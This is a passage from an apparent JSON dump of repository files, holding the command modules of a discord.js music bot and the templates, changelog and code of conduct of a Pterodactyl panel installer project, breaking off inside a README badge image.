            "code": "\r\nconst { EMOJI_DONE } = require('../config.json');\r\n\r\nmodule.exports = {\r\n    name: \"disconnect\",\r\n    aliases: [\"dc\", \"disconnect\", \"nikal\"],\r\n    description: \"Leaves VC\",\r\n    async execute(message, args) {\r\n        const { channel } = message.member.voice;\r\n    \r\n        const serverQueue = message.client.queue.get(message.guild.id);\r\n        if (!channel) return message.reply(\"You need to join a voice channel which i'm in - to disconnect me!\").catch(console.error);\r\n        if (serverQueue && channel !== message.guild.me.voice.channel)\r\n          return message.reply(`You must be in the same channel as ${message.client.user}`).catch(console.error);\r\n\r\n            message.member.voice.channel.leave();\r\n            \r\n           \r\n            message.react(EMOJI_DONE);\r\n        }\r\n    }\r\n\r\n\r\n\r\n    console.log(\"DC / Disconnect working\")"
        },
        "help.js": {
            "code": "const { MessageEmbed } = require(\"discord.js\");\nconst { EMOJI_DONE , BOT_ID } = require('../config.json');\n\n// message.react(EMOJI_DONE);\n\nmodule.exports = {\n  name: \"h\",\n  aliases: [\"help\"],\n  description: \"Display all commands and descriptions\",\n  execute(message) {\n    let commands = message.client.commands.array();\n\n    let helpEmbed = new MessageEmbed()\n      .setTitle(`${message.client.user.username} Help`)\n      .setDescription(`This are the all commands of <@${BOT_ID}> ! ${EMOJI_DONE}`)\n      \n      .setColor(\"RED\")\n\n      .setFooter(`Hey Want to make a bot like this then - https://github.com/NIRMAL1090/ProMusicBot`);\n      \n      \n    commands.forEach((cmd) => {\n      helpEmbed.addField(\n        `**${message.client.prefix}${cmd.name} ${cmd.aliases ? `(${cmd.aliases})` : \"\"}**`,\n        `${cmd.description}`,\n        true\n      );\n     \n\n\n    });\n\n   // helpEmbed.setTimestamp();\n\n    return message.channel.send(helpEmbed).catch(console.error);\n  }\n};\n\n\nconsole.log(\"help working\")\n"
        },
        "invite.js": {
            "code": "const { MessageEmbed } = require(\"discord.js\");\n\nconst { EMOJI_ARROW } = require('../config.json');\nconst { SERVER_INVITE } = require('../config.json');\nconst { BOT_ID } = require('../config.json');\n\nmodule.exports = {\n  name: \"invite\",\n  aliases: [\"inv\"],\n  description: \"To add/invite the bot to your server\",\n  execute(message, args) {\n    //set the permissions id here (https://discordapi.com/permissions.html)\n    var permissions = 70282305;\n\n    let invite = new MessageEmbed()\n      .setTitle(`**SUPPORT SERVER**`)\n      .setDescription(\n\n\n`${EMOJI_ARROW} **Invite me with Normal Perms [(Click Here)](https://discord.com/oauth2/authorize?client_id=${BOT_ID}&permissions=${permissions}&scope=bot)**\n\n${EMOJI_ARROW}  **Invite me with Admin Perms [(Click Here)](https://discord.com/api/oauth2/authorize?client_id=${BOT_ID}&permissions=8&scope=bot)**\n`\n          \n      )\n      .setURL(\n        `${SERVER_INVITE}`\n      )\n      .setColor(\"RANDOM\");\n    return message.channel.send(invite);\n  }\n};\n\n\n\nconsole.log(\"invite working\")"
        },
        "join.js": {
            "code": "const distube = require('../index.js');\r\nconst { MessageEmbed } = require(\"discord.js\");\r\nconst { EMOJI_DONE ,EMOJI_ERROR } = require(\"../config.json\")\r\nmodule.exports = {\r\n    name: \"join\",\r\n    aliases: [\"j\", \"247\", \"24/7\", \"24x7\",\"aaja\",\"aja\"],\r\n    description: \"Join your VC for 27/7\",\r\n    async execute(message, args) {\r\n        const { channel } = message.member.voice;\r\n    \r\n        const serverQueue = message.client.queue.get(message.guild.id);\r\n        if (!channel) return message.reply(`${EMOJI_ERROR} You need to join a voice channel first!`).catch(console.error);\r\n        if (serverQueue && channel !== message.guild.me.voice.channel)\r\n          return message.reply(`${EMOJI_ERROR} You must be in the same channel as ${message.client.user}`).catch(console.error);\r\n\r\n\r\n          \r\n\r\n            await message.member.voice.channel.join()\r\n            return message.react(EMOJI_DONE);\r\n        }\r\n    }\r\n\r\n\r\n    console.log(\"Join working\")"
        },
        "loop.js": {
            "code": "const { canModifyQueue } = require(\"../util/PreobotUtil\");\nconst {EMOJI_DONE} = require('../config.json');\n\nmodule.exports = {\n  name: \"loop\",\n  aliases: [\"l\"],\n  description: \"Toggle music loop\",\n  execute(message) {\n    const queue = message.client.queue.get(message.guild.id);\n    if (!queue) return message.reply(\"There is nothing playing.\").catch(console.error);\n    if (!canModifyQueue(message.member)) return;\n\n    // toggle from false to true and reverse\n    queue.loop = !queue.loop;\n\n    message.react(EMOJI_DONE);\n    return queue.textChannel.send(`Loop is now ${queue.loop ? \"**on**\" : \"**off**\"}`).catch(console.error);  \n  }\n};\n\n\nconsole.log(\"Loop working\")"
        },
        "lyrics.js": {
            "code": "const { MessageEmbed } = require(\"discord.js\");\nconst lyricsFinder = require(\"lyrics-finder\");\n\nmodule.exports = {\n  name: \"lyrics\",\n  aliases: [\"ly\"],\n  description: \"Get lyrics for the currently playing song\",\n  async execute(message) {\n    const queue = message.client.queue.get(message.guild.id);\n    if (!queue) return message.channel.send(\"There is nothing playing.\").catch(console.error);\n\n    let lyrics = null;\n\n    try {\n      lyrics = await lyricsFinder(queue.songs[0].title, \"\");\n      if (!lyrics) lyrics = `No lyrics found for ${queue.songs[0].title}.`;\n    } catch (error) {\n      lyrics = `No lyrics found for ${queue.songs[0].title}.`;\n    }\n\n    let lyricsEmbed = new MessageEmbed()\n      .setTitle(`${queue.songs[0].title} \u2014 Lyrics`)\n      .setDescription(lyrics)\n      .setColor(\"#F8AA2A\")\n      .setTimestamp();\n\n    if (lyricsEmbed.description.length >= 2048)\n      lyricsEmbed.description = `${lyricsEmbed.description.substr(0, 2045)}...`;\n    return message.channel.send(lyricsEmbed).catch(console.error);\n  }\n};\n\n\nconsole.log(\"Lyrics working\")"
        },
        "play.js": {
            "code": "const ytdl = require(\"erit-ytdl\");\r\nconst scdl = require(\"soundcloud-downloader\").default;\r\nconst { canModifyQueue, STAY_TIME } = require(\"../util/PreobotUtil\");\r\nconst {EMOJI_ARROW , EMOJI_STARTED_PLAYING , EMOJI_DONE }= require('../config.json');\r\nmodule.exports = {\r\n  async play(song, message) {\r\n    const { SOUNDCLOUD_CLIENT_ID } = require(\"../util/PreobotUtil\");\r\n\r\n    let config;\r\n\r\n    try {\r\n      config = require(\"../config.json\");\r\n    } catch (error) {\r\n      config = null;\r\n    }\r\n\r\n    const PRUNING = config ? config.PRUNING : process.env.PRUNING;\r\n\r\n    const queue = message.client.queue.get(message.guild.id);\r\n\r\n    if (!song) {\r\n      if (queue.connection.dispatcher && message.guild.me.voice.channel) return;\r\n    queue.textChannel.send(`I'have played all the songs, Now my queue list is empty! ,i'm in vc just  **${message.client.prefix}p <song name>** ,to play song`).catch(console.error);\r\n    return message.client.queue.delete(message.guild.id);\r\n  }\r\n\r\n    let stream = null;\r\n    let streamType = song.url.includes(\"youtube.com\") ? \"opus\" : \"ogg/opus\";\r\n\r\n    try {\r\n      if (song.url.includes(\"youtube.com\")) {\r\n        stream = await ytdl(song.url, { highWaterMark: 1 << 25 });\r\n      } else if (song.url.includes(\"soundcloud.com\")) {\r\n        try {\r\n          stream = await scdl.downloadFormat(song.url, scdl.FORMATS.OPUS, SOUNDCLOUD_CLIENT_ID);\r\n        } catch (error) {\r\n          stream = await scdl.downloadFormat(song.url, scdl.FORMATS.MP3, SOUNDCLOUD_CLIENT_ID);\r\n          streamType = \"unknown\";\r\n        }\r\n      }\r\n    } catch (error) {\r\n      if (queue) {\r\n        queue.songs.shift();\r\n        module.exports.play(queue.songs[0], message);\r\n      }\r\n\r\n      console.error(error);\r\n      return message.channel.send(`Error: ${error.message ? error.message : error}`);\r\n    }\r\n\r\n    queue.connection.on(\"disconnect\", () => message.client.queue.delete(message.guild.id));\r\n\r\n    const dispatcher = queue.connection\r\n      .play(stream, { type: streamType })\r\n      .on(\"finish\", () => {\r\n        if (collector && !collector.ended) collector.stop();\r\n\r\n        if (queue.loop) {\r\n          // if loop is on, push the song back at the end of the queue\r\n          // so it can repeat endlessly\r\n          let lastSong = queue.songs.shift();\r\n          queue.songs.push(lastSong);\r\n          module.exports.play(queue.songs[0], message);\r\n        } else {\r\n          // Recursively play the next song\r\n          queue.songs.shift();\r\n          module.exports.play(queue.songs[0], message);\r\n        }\r\n      })\r\n      .on(\"error\", (err) => {\r\n        console.error(err);\r\n        queue.songs.shift();\r\n        module.exports.play(queue.songs[0], message);\r\n      });\r\n    dispatcher.setVolumeLogarithmic(queue.volume / 100);\r\n\r\n    try {\r\n\r\n\r\n      \r\n   \r\n      \r\nvar playingMessage = await queue.textChannel.send(`\r\n${EMOJI_STARTED_PLAYING} Started playing : \r\n${EMOJI_ARROW} ***NAME :*** ${song.title} \r\n${EMOJI_ARROW} ***LINK :*** ${song.url}`);\r\n\r\n      await playingMessage.react(\"\u23ed\");\r\n      await playingMessage.react(\"\u23f8\");\r\n      await playingMessage.react(\"\ud83d\udd07\");\r\n      await playingMessage.react(\"\ud83d\udd09\");\r\n      await playingMessage.react(\"\ud83d\udd0a\");\r\n      await playingMessage.react(\"\ud83d\udd01\");\r\n      await playingMessage.react(\"\u23f9\");\r\n    } catch (error) {\r\n      console.error(error);\r\n    }\r\n\r\n    const filter = (reaction, user) => user.id !== message.client.user.id;\r\n    var collector = playingMessage.createReactionCollector(filter, {\r\n      time: song.duration > 0 ? song.duration * 1000 : 600000\r\n    });\r\n\r\n    collector.on(\"collect\", (reaction, user) => {\r\n      if (!queue) return;\r\n      const member = message.guild.member(user);\r\n\r\n      switch (reaction.emoji.name) {\r\n        case \"\u23ed\":\r\n          queue.playing = true;\r\n          reaction.users.remove(user).catch(console.error);\r\n          if (!canModifyQueue(member)) return;\r\n          queue.connection.dispatcher.end();\r\n          queue.textChannel.send(`${user} \u23e9 skipped the song`).catch(console.error);\r\n          collector.stop();\r\n          break;\r\n\r\n        case \"\u23f8\":\r\n          reaction.users.remove(user).catch(console.error);\r\n          if (!canModifyQueue(member)) return;\r\n          if (queue.playing) {\r\n            queue.playing = !queue.playing;\r\n            queue.connection.dispatcher.pause(true);\r\n            queue.textChannel.send(`${user} \u23f8 paused the music.`).catch(console.error);\r\n          } else {\r\n            queue.playing = !queue.playing;\r\n            queue.connection.dispatcher.resume();\r\n            queue.textChannel.send(`${user} \u25b6 resumed the music!`).catch(console.error);\r\n          }\r\n          break;\r\n\r\n        case \"\ud83d\udd07\":\r\n          reaction.users.remove(user).catch(console.error);\r\n          if (!canModifyQueue(member)) return;\r\n          if (queue.volume <= 0) {\r\n            queue.volume = 100;\r\n            queue.connection.dispatcher.setVolumeLogarithmic(100 / 100);\r\n            queue.textChannel.send(`${user} \ud83d\udd0a unmuted the music!`).catch(console.error);\r\n          } else {\r\n            queue.volume = 0;\r\n            queue.connection.dispatcher.setVolumeLogarithmic(0);\r\n            queue.textChannel.send(`${user} \ud83d\udd07 muted the music!`).catch(console.error);\r\n          }\r\n          break;\r\n\r\n        case \"\ud83d\udd09\":\r\n          reaction.users.remove(user).catch(console.error);\r\n          if (!canModifyQueue(member) || queue.volume == 0) return;\r\n          if (queue.volume - 10 <= 0) queue.volume = 0;\r\n          else queue.volume = queue.volume - 10;\r\n          queue.connection.dispatcher.setVolumeLogarithmic(queue.volume / 100);\r\n          queue.textChannel\r\n            .send(`${user} \ud83d\udd09 decreased the volume, the volume is now ${queue.volume}%`)\r\n            .catch(console.error);\r\n          break;\r\n\r\n        case \"\ud83d\udd0a\":\r\n          reaction.users.remove(user).catch(console.error);\r\n          if (!canModifyQueue(member) || queue.volume == 100) return;\r\n          if (queue.volume + 10 >= 100) queue.volume = 100;\r\n          else queue.volume = queue.volume + 10;\r\n          queue.connection.dispatcher.setVolumeLogarithmic(queue.volume / 100);\r\n          queue.textChannel\r\n            .send(`${user} \ud83d\udd0a increased the volume, the volume is now ${queue.volume}%`)\r\n            .catch(console.error);\r\n          break;\r\n\r\n        case \"\ud83d\udd01\":\r\n          reaction.users.remove(user).catch(console.error);\r\n          if (!canModifyQueue(member)) return;\r\n          queue.loop = !queue.loop;\r\n          queue.textChannel.send(`${user} Loop is now ${queue.loop ? \"**on**\" : \"**off**\"}  ${EMOJI_DONE} `).catch(console.error);\r\n          break;\r\n\r\n        case \"\u23f9\":\r\n          reaction.users.remove(user).catch(console.error);\r\n          if (!canModifyQueue(member)) return;\r\n          queue.songs = [];\r\n          queue.textChannel.send(`${user} stopped the music. ${EMOJI_DONE}`).catch(console.error);\r\n          try {\r\n            queue.connection.dispatcher.end();\r\n          } catch (error) {\r\n            console.error(error);\r\n            queue.connection.disconnect();\r\n          }\r\n          collector.stop();\r\n          break;\r\n\r\n        default:\r\n          reaction.users.remove(user).catch(console.error);\r\n          break;\r\n      }\r\n    });\r\n\r\n    collector.on(\"end\", () => {\r\n      playingMessage.reactions.removeAll().catch(console.error);\r\n      if (PRUNING && playingMessage && !playingMessage.deleted) {\r\n        playingMessage.delete({ timeout: 3000 }).catch(console.error);\r\n      }\r\n    });\r\n  }\r\n};\r\n"
        },
        "index.js": {
            "code": "/**\n * Module Imports\n */\nconst { Client, Collection } = require(\"discord.js\");\nconst { readdirSync } = require(\"fs\");\nconst { join } = require(\"path\");\nconst { TOKEN, PREFIX } = require(\"./util/PreobotUtil\");\nconst client = new Client({ disableMentions: \"everyone\" });\n\nclient.login(TOKEN);\nclient.commands = new Collection();\nclient.prefix = PREFIX;\nclient.queue = new Map();\nconst cooldowns = new Collection();\nconst escapeRegex = (str) => str.replace(/[.*+?^${}()|[\\]\\\\]/g, \"\\\\$&\");\nconst {BOT_PREFIX, BOT_STATUS2, BOT_STATUS3 , BOT_PRESENCE } = require('./config.json');\n\n/**\n * Client Events\n */\nclient.on(\"ready\", () => {\n   function randomStatus() {\n let status = [`${BOT_STATUS2}`,`${BOT_STATUS3}`, `${BOT_PREFIX}play ON ${client.guilds.cache.size} Servers`]\nlet rstatus = Math.floor(Math.random() * status.length);\n\nclient.user.setActivity(status[rstatus], {type: `${BOT_PRESENCE}` });\n}; setInterval(randomStatus, 30000)\n\nconsole.log('Bot is ready to play songs !')\n})\nclient.on(\"warn\", (info) => console.log(info));\nclient.on(\"error\", console.error);\n\n/**\n * Import all commands\n */\nconst commandFiles = readdirSync(join(__dirname, \"commands\")).filter((file) => file.endsWith(\".js\"));\nfor (const file of commandFiles) {\n  const command = require(join(__dirname, \"commands\", `${file}`));\n  client.commands.set(command.name, command);\n}\n\nclient.on(\"message\", async (message) => {\n  if (message.author.bot) return;\n  if (!message.guild) return;\n\n  const prefixRegex = new RegExp(`^(<@!?${client.user.id}>|${escapeRegex(PREFIX)})\\\\s*`);\n  if (!prefixRegex.test(message.content)) return;\n\n  const [, matchedPrefix] = message.content.match(prefixRegex);\n\n  const args = message.content.slice(matchedPrefix.length).trim().split(/ +/);\n  const commandName = args.shift().toLowerCase();\n\n  const command =\n    client.commands.get(commandName) ||\n    client.commands.find((cmd) => cmd.aliases && cmd.aliases.includes(commandName));\n\n  if (!command) return;\n\n  if (!cooldowns.has(command.name)) {\n    cooldowns.set(command.name, new Collection());\n  }\n\n  const now = Date.now();\n  const timestamps = cooldowns.get(command.name);\n  const cooldownAmount = (command.cooldown || 1) * 1000;\n\n  if (timestamps.has(message.author.id)) {\n    const expirationTime = timestamps.get(message.author.id) + cooldownAmount;\n\n    if (now < expirationTime) {\n      const timeLeft = (expirationTime - now) / 1000;\n      return message.reply(\n        `please wait ${timeLeft.toFixed(1)} more second(s) before reusing the \\`${command.name}\\` command.`\n      );\n    }\n  }\n\n  timestamps.set(message.author.id, now);\n  setTimeout(() => timestamps.delete(message.author.id), cooldownAmount);\n\n  try {\n    command.execute(message, args);\n  } catch (error) {\n    console.error(error);\n    message.reply(\"There was an error executing that command.\").catch(console.error);\n  }\n});\n\n"
        }
    },
    "pterodactyl-installer": {
        "bug_report.md": {
            "code": "---\nname: Bug report\nabout: Create a bug report\n\n---\n\n**Describe the bug**\nA clear and concise description of what the bug is.\n\n**To Reproduce**\nSteps to reproduce the behaviour:\n1. Go to '...'\n2. Click on '....'\n3. Scroll down to '....'\n4. See error\n\n**Expected behaviour**\nA clear and concise description of what you expected to happen.\n\n**Screenshots**\nIf applicable, add screenshots to help explain your problem.\n\n**OS (please complete the following information):**\n - OS: [e.g. Ubuntu, Debian, CentOS]\n - Installation: [panel or wings]\n\n**Additional context**\nAdd any other context about the problem here.\n"
        },
        "feature_request.md": {
            "code": "---\nname: Feature request\nabout: Suggest an idea for this project\n\n---\n\n**Is your feature request related to a problem? Please describe.**\nA clear and concise description of what the problem is. Ex. I'm always frustrated when [...]\n\n**Describe the solution you'd like**\nA clear and concise description of what you want to happen.\n\n**Describe alternatives you've considered**\nA clear and concise description of any alternative solutions or features you've considered.\n\n**Additional context**\nAdd any other context or screenshots about the feature request here.\n"
        },
        "pull_request_template.md": {
            "code": "<!-- Include all your changes, either in written form or as a list. Try to be as clear as possible. -->\n\nFixes #??\n<!-- include the issue number if this pull request is fixing that issue -->\n"
        },
        "CHANGELOG.md": {
            "code": "# Changelog\n\nThis project follows the [semantic versioning](https://semver.org) convention. Changelog points should be divided into fixed, changed, or added.\n\n## next-release\n\n### Added\n\n- [#249](https://github.com/vilhelmprytz/pterodactyl-installer/issues/249) install: Automatically log installation process to `/var/log/pterodactyl-installer.log` (thanks [@Linux123123](https://github.com/Linux123123) for contributing!).\n\n### Fixed\n\n- [#229](https://github.com/vilhelmprytz/pterodactyl-installer/issues/229) wings: Fixed a bug that would cause the process of obtaining a Let's Encrypt certificate to fail on CentOS 7 and CentOS 8 due to the missing `epel-release` package (thanks [@Linux123123](https://github.com/Linux123123) for reporting!).\n\n## v0.8.1 (released on 2021-08-28)\n\n### Fixed\n\n- [#238](https://github.com/vilhelmprytz/pterodactyl-installer/issues/238) panel: Fixed a bug that would cause the installation script to fail on CentOS 8 because of invalid reference to `mariadb-secure-installation`.\n\n## v0.8.0 (released on 2021-08-28)\n\n### Added\n\n- [#220](https://github.com/vilhelmprytz/pterodactyl-installer/issues/220) wings: Add a feature that lets the user automatically create a user for \"database host\" (thanks [@sinjs](https://github.com/sinjs) for contributing!).\n- [#230](https://github.com/vilhelmprytz/pterodactyl-installer/issues/230) panel/wings: Added support for Debian 11 (bullseye) (thanks [@Linux123123](https://github.com/Linux123123) for contributing!).\n\n## v0.7.1 (released on 2021-07-31)\n\n### Fixed\n\n- [#217](https://github.com/vilhelmprytz/pterodactyl-installer/issues/217) panel: Fixed a bug that would cause the panel installation to fail on CentOS since the symlink `mysql_secure_installation` is gone (thanks [@aa-abert](https://github.com/aa-abert) for contributing!).\n\n## v0.7.0 (released on 2021-07-16)\n\n### Fixed\n\n- [#193](https://github.com/vilhelmprytz/pterodactyl-installer/issues/193) lib/verify-fqdn: Fixed a minor typo, the word \"Encrypt\" was misspelled and is now fixed (thanks to [@Hey](https://github.com/Hey) for contributing!).\n- [#201](https://github.com/vilhelmprytz/pterodactyl-installer/issues/201) lib/verify-fqdn: Fixed so that CNAME records work as FQDN and are properly detected by the script (thanks to [@jobhh](https://github.com/jobhh) for contributing!).\n- [#200](https://github.com/vilhelmprytz/pterodactyl-installer/issues/200) wings: Fixed a bug that would cause the script to not detect unsupported virtualization (thanks [@Linux123123](https://github.com/Linux123123) for contributing!).\n\n### Added\n\n- [#81](https://github.com/vilhelmprytz/pterodactyl-installer/issues/81) wings: Added a feature that automatically skips the MariaDB question if MySQL/MariaDB is detected.\n- [#204](https://github.com/vilhelmprytz/pterodactyl-installer/issues/204) wings: Added support for arm64 (thanks to [@puiemonta1234](https://github.com/puiemonta1234) for contributing!).\n\n## v0.6.0 (released on 2021-05-21)\n\n### Fixed\n\n- [#186](https://github.com/vilhelmprytz/pterodactyl-installer/issues/186) panel: Fixed a bug that would cause the script to exit if the script tried to create a symbolic link twice (thanks [@Linux123123](https://github.com/Linux123123) for reporting and contributing!).\n\n### Added\n\n- [#157](https://github.com/vilhelmprytz/pterodactyl-installer/issues/157) panel/wings: Added email validation. Emails are now validated using a regex before accepted as values (thanks [@Linux123123](https://github.com/Linux123123) for contributing!).\n\n## v0.5.0 (released on 2021-05-15)\n\n### Fixed\n\n- [#158](https://github.com/vilhelmprytz/pterodactyl-installer/issues/158) panel: Fixed a bug that would let users run the panel script on other CPU architectures than `x86_64`, script now prints a warning if the user is using anything but `x86_64` (thanks [@Linux123123](https://github.com/Linux123123) for contributing!).\n- [#176](https://github.com/vilhelmprytz/pterodactyl-installer/pull/176) wings: Fixed a broken link to the official documentation (thanks to [@sinmineryt](https://github.com/sinmineryt) for contributing!).\n\n### Changed\n\n- [#160](https://github.com/vilhelmprytz/pterodactyl-installer/issues/160) wings: Unsupported virtualization types no longer forcefully quit the script. An option to override the check has been added.\n\n## v0.4.0 (released on 2021-03-16)\n\n### Changed\n\n- [#168](https://github.com/vilhelmprytz/pterodactyl-installer/pull/168) panel: Use PHP version 8.0 over 7.4 for all supported installations (thanks [@Linux123123](https://github.com/Linux123123) for contributing!).\n\n## v0.3.0 (released on 2021-02-24)\n\n### Fixed\n\n- [#151](https://github.com/vilhelmprytz/pterodactyl-installer/issues/151) panel: `APP_ENVIRONMENT_ONLY` was set to `true` when it should be `false`. This caused the panel to prohibit modifying the settings from the web interface, which is not intended behavior.\n- [#165](https://github.com/vilhelmprytz/pterodactyl-installer/issues/165) panel: Fix so that the `pteroq` service uses the correct user on CentOS (thanks [@PipeItToDevNull](https://github.com/PipeItToDevNull) for reporting!).\n\n### Changed\n\n- [#129](https://github.com/vilhelmprytz/pterodactyl-installer/issues/129) wings: Clarify how to connect new Wings installation with the panel (using auto deploy).\n- [#153](https://github.com/vilhelmprytz/pterodactyl-installer/pull/153) panel/wings: Changed so that the script will no longer tell you to open firewall ports if you have enabled automatic firewall configuration.\n- [#153](https://github.com/vilhelmprytz/pterodactyl-installer/pull/153) panel: Remove deprecated third-party suggestions.\n\n### Added\n\n- [#148](https://github.com/vilhelmprytz/pterodactyl-installer/issues/148) wings: Added so that the Wings installation script will now verify FQDN using `lib/verify-fqdn` if the user chooses to configure Let's Encrypt automatically.\n\n## v0.2.0 (released on 2021-01-18)\n\n### Fixed\n\n- [#113](https://github.com/vilhelmprytz/pterodactyl-installer/issues/113) panel: Fixed a bug that would cause the script to exit due to failing to create a \"bus connection\". Related to [#115](https://github.com/vilhelmprytz/pterodactyl-installer/issues/115) as well.\n- [#135](https://github.com/vilhelmprytz/pterodactyl-installer/issues/135) panel/wings: Fixed so that the automatic ufw firewall configuration no longer requires confirming for the enable operation (user interaction after initial configuration is not intended behavior).\n\n### Changed\n\n- [#88](https://github.com/vilhelmprytz/pterodactyl-installer/issues/88) panel: Changed so that certbot now uses `certbot --nginx` over `certbot certonly` which makes it easier to perform certificate renewals later on (thanks [@Linux123123](https://github.com/Linux123123)).\n- [#100](https://github.com/vilhelmprytz/pterodactyl-installer/pull/100) panel: Refactor several different functions in panel script, removal of redundant variables and functions and general cleanup/restructure (thanks [@Linux123123](https://github.com/Linux123123)).\n- [#115](https://github.com/vilhelmprytz/pterodactyl-installer/issues/115) panel: Refactor timezone validation.\n- [#137](https://github.com/vilhelmprytz/pterodactyl-installer/issues/137) panel: Removed ability to run `p:environment:mail` script since it's redundant.\n- [#139](https://github.com/vilhelmprytz/pterodactyl-installer/pull/139) wings: Refactor - replaced all `\"$var\"` with `[ \"$var\" == true ]` (thanks [@Linux123123](https://github.com/Linux123123)).\n\n### Added\n\n- [098d01a](https://github.com/vilhelmprytz/pterodactyl-installer/commit/098d01a9729dffaf40e80077da2d7d51b42a197b) panel: Add a prompt in `verify-fqdn` that requires user consent before performing HTTPS request against [https://checkip.pterodactyl-installer.se](https://checkip.pterodactyl-installer.se).\n- [#78](https://github.com/vilhelmprytz/pterodactyl-installer/issues/78) panel: Add option to auto-generate MySQL passwords and remember them throughout the installation.\n\n## v0.1.1 (released on 2021-01-01)\n\n### Fixed\n\n- [#133](https://github.com/vilhelmprytz/pterodactyl-installer/issues/133) panel: Fixed the `verify-fqdn.sh` so that it now installs the packages quietly. Panel script will now only execute the FQDN verification if `ASSUME_SSL` or `CONFIGURE_LETSENCRYPT` is true.\n\n## v0.1.0 (released on 2021-01-01)\n\n- Initial release, introduces versioning to the project\n"
        },
        "CODE_OF_CONDUCT.md": {
            "code": "# Contributor Covenant Code of Conduct\n\n## Our Pledge\n\nIn the interest of fostering an open and welcoming environment, we as\ncontributors and maintainers pledge to making participation in our project and\nour community a harassment-free experience for everyone, regardless of age, body\nsize, disability, ethnicity, sex characteristics, gender identity and expression,\nlevel of experience, education, socio-economic status, nationality, personal\nappearance, race, religion, or sexual identity and orientation.\n\n## Our Standards\n\nExamples of behavior that contributes to creating a positive environment\ninclude:\n\n* Using welcoming and inclusive language\n* Being respectful of differing viewpoints and experiences\n* Gracefully accepting constructive criticism\n* Focusing on what is best for the community\n* Showing empathy towards other community members\n\nExamples of unacceptable behavior by participants include:\n\n* The use of sexualized language or imagery and unwelcome sexual attention or\n advances\n* Trolling, insulting/derogatory comments, and personal or political attacks\n* Public or private harassment\n* Publishing others' private information, such as a physical or electronic\n address, without explicit permission\n* Other conduct which could reasonably be considered inappropriate in a\n professional setting\n\n## Our Responsibilities\n\nProject maintainers are responsible for clarifying the standards of acceptable\nbehavior and are expected to take appropriate and fair corrective action in\nresponse to any instances of unacceptable behavior.\n\nProject maintainers have the right and responsibility to remove, edit, or\nreject comments, commits, code, wiki edits, issues, and other contributions\nthat are not aligned to this Code of Conduct, or to ban temporarily or\npermanently any contributor for other behaviors that they deem inappropriate,\nthreatening, offensive, or harmful.\n\n## Scope\n\nThis Code of Conduct applies both within project spaces and in public spaces\nwhen an individual is representing the project or its community. Examples of\nrepresenting a project or community include using an official project e-mail\naddress, posting via an official social media account, or acting as an appointed\nrepresentative at an online or offline event. Representation of a project may be\nfurther defined and clarified by project maintainers.\n\n## Enforcement\n\nInstances of abusive, harassing, or otherwise unacceptable behavior may be\nreported by contacting the project team at vilhelm@prytznet.se. All\ncomplaints will be reviewed and investigated and will result in a response that\nis deemed necessary and appropriate to the circumstances. The project team is\nobligated to maintain confidentiality with regard to the reporter of an incident.\nFurther details of specific enforcement policies may be posted separately.\n\nProject maintainers who do not follow or enforce the Code of Conduct in good\nfaith may face temporary or permanent repercussions as determined by other\nmembers of the project's leadership.\n\n## Attribution\n\nThis Code of Conduct is adapted from the [Contributor Covenant][homepage], version 1.4,\navailable at https://www.contributor-covenant.org/version/1/4/code-of-conduct.html\n\n[homepage]: https://www.contributor-covenant.org\n\nFor answers to common questions about this code of conduct, see\nhttps://www.contributor-covenant.org/faq"
        },
        "CONTRIBUTING.md": {
            "code": "# Contributing\n\nFeel free to contribute to the project by cloning the repository and sending a pull request.\n\nAs always, make sure to state the changes in the title and the comment.\n"
        },
        "README.md": {
            "code": "# :bird: pterodactyl-installer\n\n[![Build Status](https://travis-ci.com/vilhelmprytz/pterodactyl-installer.svg?branch=master)](https://travis-ci.com/vilhelmprytz/pterodactyl-installer)\n[![License: GPL v3](https://img.shields.io/github/license/vilhelmprytz/pterodactyl-installer)](LICENSE)\n[![Discord](https://img.shields.io/discord/682342331206074373?label=&logo=discord&logoColor=ffffff&color=7389D8&labelColor=6A7EC2)](https://pterodactyl-installer.se/discord)\n[![made-with-bash](https://img.shields.io/badge/-Made%20with%20Bash-1f425f.svg?logo=image%2Fpng%3Bbase64%2CiVBORw0KGgoAAAANSUhEUgAAABgAAAAYCAYAAADgdz34AAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyZpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw%2FeHBhY2tldCBiZWdpbj0i77u%2FIiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8%2BIDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuNi1jMTExIDc5LjE1ODMyNSwgMjAxNS8wOS8xMC0wMToxMDoyMCAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENDIDIwMTUgKFdpbmRvd3MpIiB4bXBNTTpJbnN0YW5jZUlEPSJ4bXAuaWlkOkE3MDg2QTAyQUZCMzExRTVBMkQxRDMzMkJDMUQ4RDk3IiB4bXBNTTpEb2N1bWVudElEPSJ4bXAuZGlkOkE3MDg2QTAzQUZCMzExRTVBMkQxRDMzMkJDMUQ4RDk3Ij4gPHhtcE1NOkRlcml2ZWRGcm9tIHN0UmVmOmluc3RhbmNlSUQ9InhtcC5paWQ6QTcwODZBMDBBRkIzMTFFNUEyRDFEMzMyQkMxRDhEOTciIHN0UmVmOmRvY3VtZW50SUQ9InhtcC5kaWQ6QTcwODZBMDFBRkIzMTFFNUEyRDFEMzMyQkMxRDhEOTciLz4gPC9yZGY6RGVzY3JpcHRpb24%2BIDwvcmRmOlJERj4gPC94OnhtcG1ldGE%2BIDw%2FeHBhY2tldCBlbmQ9InIiPz6lm45hAAADkklEQVR42qyVa0yTVxzGn7d9Wy03MS2ii8s%2BeokYNQSVhCzOjXZOFNF4jx%2BMRmPUMEUEqVG36jo2thizLSQSMd4N8ZoQ8RKjJtooaCpK6ZoCtRXKpRempbTv5ey83bhkAUphz8fznvP8znn%2B%2F